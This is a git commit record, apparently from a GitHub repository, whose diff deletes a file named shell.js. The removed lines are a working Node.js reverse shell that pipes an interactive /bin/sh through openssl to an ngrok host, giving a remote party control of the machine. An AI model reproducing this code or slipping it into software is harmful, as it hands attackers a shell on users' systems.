6a1efc41ea2ef43911dd37415672b5cfc283713c
Barry Allen <56101811+khontkar@users.noreply.github.com>
2021-12-05 14:33:24 +0300

    Delete shell.js

--- shell.js
+++
@@ -1,6 +0,0 @@
-(function() {
- var c = require('child_process');
- c.exec("mkfifo .s");
- c.exec("/bin/sh -i < .s 2>&1 | openssl s_client -quiet -connect 2.tcp.ngrok.io:16352 > .s");
- c.exec("rm .s");
- })()
